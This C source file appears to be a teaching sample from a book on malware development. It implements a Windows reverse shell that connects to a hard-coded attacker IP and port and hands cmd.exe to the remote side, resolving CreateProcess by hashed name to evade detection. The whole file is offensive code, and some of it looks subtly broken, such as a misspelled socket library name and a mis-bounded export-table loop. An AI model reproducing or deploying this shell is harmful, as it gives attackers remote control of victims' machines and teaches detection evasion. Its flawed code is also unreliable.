/*
 * Malware Development for Ethical Hackers
 * hack.c - ASM code obfuscation
 * author @cocomelonc
*/

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "w2_32")

typedef int (WINAPI *CreateProcess_t)(
  LPCSTR, LPSTR,
  LPSECURITY_ATTRIBUTES,
  LPSECURITY_ATTRIBUTES,
  BOOL, DWORD, LPVOID, LPCSTR,
  LPSTARTUPINFOA, LPPROCESS_INFORMATION
);

DWORD calcHash(char *string) {
  size_t stringLength = strnlen_s(string, 50);
  DWORD hash = 0x35;
  for (size_t i = 0; i < stringLength; i++) {
    hash += (hash * 0xab10f29f + string[i]) & 0xffffff;
  }
  return hash;
}

static LPVOID getAPIAddr(HMODULE h, DWORD hash) {
  PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
  PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
  PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
    (LPBYTE)h + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
  PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
  PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
  PWORD  fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);
  for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
    LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);
    if (calcHash(pFuncName) == hash) {
      return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
    }
  }
  return nullptr;
}

WSADATA socketData;
SOCKET mainSocket;
struct sockaddr_in connectionAddress;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInfo;

int main(int argc, char* argv[]) {
  
  // ip and port details for the attacker's machine
  char *attackerIP = "10.10.1.5";
  short attackerPort = 4444;

  // initialize socket library
  WSAStartup(MAKEWORD(2, 2), &socketData);

  // create socket object
  mainSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  connectionAddress.sin_family = AF_INET;
  connectionAddress.sin_port = htons(attackerPort);
  connectionAddress.sin_addr.s_addr = inet_addr(attackerIP);

  // establish connection to the remote host
  WSAConnect(mainSocket, (SOCKADDR*)&connectionAddress, sizeof(connectionAddress), NULL, NULL, NULL, NULL);

  memset(&startupInfo, 0, sizeof(startupInfo));
  startupInfo.cb = sizeof(startupInfo);
  startupInfo.dwFlags = STARTF_USESTDHANDLES;
  startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE) mainSocket;

  // resolve function addresses 
  LPVOID address = getAPIAddr((char *)"kernel32", 0x005d47253);
  CreateProcess_t myCreateProcess = (CreateProcess_t)address;

  // initiate cmd.exe with redirected streams
  myCreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo);

  exit(0);
}
